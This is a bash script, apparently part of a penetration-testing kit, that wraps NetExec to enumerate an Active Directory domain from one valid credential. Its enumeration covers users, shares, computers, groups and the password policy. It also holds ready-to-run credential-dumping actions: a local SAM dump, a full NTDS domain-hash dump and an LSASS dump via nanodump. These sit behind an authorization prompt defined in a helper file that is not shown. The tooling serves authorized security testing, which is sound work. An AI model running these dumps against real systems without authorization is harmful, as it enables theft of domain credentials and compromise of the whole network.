#!/usr/bin/env bash
# Enumerate a domain from one valid credential with NetExec (nxc).
# Mirrors: ad-enumeration.md
#
# One credential -> users, shares, computers, groups, password policy. The
# credential-dumping actions (sam, ntds, lsass) are destructive/high-impact and
# gated behind the authorization prompt.

cd "$(dirname "$0")"
source ./lib.sh

HOST="" USER="" PASS="" ACTION=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    -H|--host) HOST="${2:-}"; shift 2 ;;
    -u|--user) USER="${2:-}"; shift 2 ;;
    -p|--pass) PASS="${2:-}"; shift 2 ;;
    -h|--help) ACTION="help"; shift ;;
    *)         ACTION="${ACTION:-$1}"; shift ;;
  esac
done

ACTIONS="check | users | shares | computers | groups | pass-pol | sam | ntds | lsass"
if [[ "$ACTION" == "help" || -z "$HOST" || -z "$USER" || -z "$PASS" || -z "$ACTION" ]]; then
  usage_and_exit "$0 -H <dc-ip> -u <user> -p <pass> <action>
       actions: $ACTIONS"
fi
need nxc

case "$ACTION" in
  check)     run nxc smb  "$HOST" -u "$USER" -p "$PASS" ;;
  users)     run nxc smb  "$HOST" -u "$USER" -p "$PASS" --users ;;
  shares)    run nxc smb  "$HOST" -u "$USER" -p "$PASS" --shares ;;
  computers) run nxc ldap "$HOST" -u "$USER" -p "$PASS" --computers ;;
  groups)    run nxc ldap "$HOST" -u "$USER" -p "$PASS" --groups ;;
  pass-pol)  run nxc smb  "$HOST" -u "$USER" -p "$PASS" --pass-pol ;;
  sam)
    authorize "$HOST (local SAM dump)"
    run nxc smb "$HOST" -u "$USER" -p "$PASS" --sam ;;
  ntds)
    authorize "$HOST (full NTDS domain-hash dump — needs a privileged account)"
    run nxc smb "$HOST" -u "$USER" -p "$PASS" --ntds ;;
  lsass)
    authorize "$HOST (LSASS dump via nanodump module)"
    run nxc smb "$HOST" -u "$USER" -p "$PASS" -M nanodump ;;
  *)
    usage_and_exit "$0 -H <dc-ip> -u <user> -p <pass> <action>
       actions: $ACTIONS" ;;
esac
